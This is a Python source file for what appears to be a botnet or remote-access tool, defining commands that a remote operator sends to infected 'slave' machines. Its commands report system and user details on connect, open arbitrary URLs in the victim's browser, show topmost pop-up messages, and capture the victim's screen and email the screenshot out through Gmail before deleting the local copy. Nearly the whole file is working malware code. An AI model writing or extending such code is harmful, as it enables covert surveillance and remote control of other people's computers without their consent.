from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from typing import List
from tkinter import Tk, Label
from pathlib import Path
import platform
import time
import getpass
import webbrowser
import smtplib
import mss
import os

from slave.lib.client import Bot



BotBasic = Bot(bot_type="BotBasic")
BotV2 = Bot(bot_type="BotV2")


@BotBasic.register('quit', all=True, help_text="Kill bot -- Usage: $quit [/all | <bot_id>]")
def exit_server(bot: Bot, args: List[str]):
    bot.exit_server()


@BotBasic.register('info', all=True, help_text="Information of bot machine -- Usage: $info [/all | <bot_id>]", on_connect=True)
def sys_info(bot: Bot, args: List[str] = None):
    template = f"OS: {platform.system()} {platform.release()} -- Processor: {platform.processor()} \
-- Computer name: {getpass.getuser()} -- Bot type: {bot.bot_type}"
    bot.send_text(template)


@BotBasic.register('help', help_text="Help text of command -- Usage: $help <cmd>")
def helper(bot: Bot, args: List[str]):
    if len(args) < 2:
        bot.send_command_help()
    else:
        cmd_dict = bot.COMMAND_SET.get(args[1], None)
        if cmd_dict is not None:
            bot.send_text(cmd_dict['help_text'])
        else:
            bot.send_text("Command not found")


## BotV2 Commands ##

@BotV2.register('visit', all=True, help_text="Open url with webbroser -- Usage: $visit [/all | <bot_id>] <url>")
def vist_url(bot: Bot, args: List[str]):
    bot.send_text(f"Opening page... {args[1]}")
    webbrowser.open(args[1])


@BotV2.register('message', all=True, help_text="Message show with tkinter -- Usage: $message [/all | <bot_id>] <message> <msec>")
def show_msg_with_tk(bot: Bot, args: List[str]):
    sec = args[len(args) - 1]
    if not sec.isnumeric():
        bot.send_text(
            "Command syntax error. Last argument must be millisecond")
    else:
        win = Tk()
        win.title("Slave Message")
        win.resizable(False, False)
        lbl = Label(win, text=' '.join(args[1:-1]), font=('Aria Bold', 50))
        lbl.grid(column=0, row=0)
        win.attributes("-topmost", True)
        if int(sec) != 0:
            win.after(sec, lambda: win.destroy())
        bot.send_text("Opening tkinter frame...")
        win.mainloop()


@BotV2.register('screenshot', all=True, help_text="Take sceenshot and send your email(Only Gmail)\
 -- Usage: $screenshot [/all | <bot_id>] <email> <password>")
def take_screenshot(bot: Bot, args: List[str]):
    if len(args) < 3:
        bot.send_text("Invalid syntax")
    else:
        try:          
            email, password = args[1], args[2]
            
            body = MIMEMultipart()
            body['From'] = email
            body['To'] = email
            body['Subject'] = f"Slave bot {bot.bot_id} screenshot"

            body.attach(MIMEText("Screenshot"))

            # Take sceenshot
            bot.send_text("Taking screenshot...")
            shot_path = bot.ROOT_PATH / 'tempt'
            shot_path.mkdir(parents=True, exist_ok=True)
            sc_name = f"{bot.bot_id}_screenshot.png" 
            
            with mss.mss() as sct:
                output = sct.shot(output=str(shot_path / sc_name))

            part = MIMEApplication(open(output, 'rb').read())
            part['Content-Disposition'] = f'attachment; filename="{output}"'
            body.attach(part)

            # Connect SMTP server
            bot.send_text("Sending email...")
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.send_message(body) 
            server.quit()

            # Delete screenshot from local
            os.remove(str(shot_path / sc_name))
            shot_path.rmdir()

            bot.send_text(f'Screenshot send {email}')
        except smtplib.SMTPAuthenticationError as authex:
            bot.send_text(f"Authentication problem: Wrong email address or password")
        except Exception as generalex:
            bot.send_text(f"Problem occurred: {generalex}")
        
BotV2.use_other_bot_commands(BotBasic)
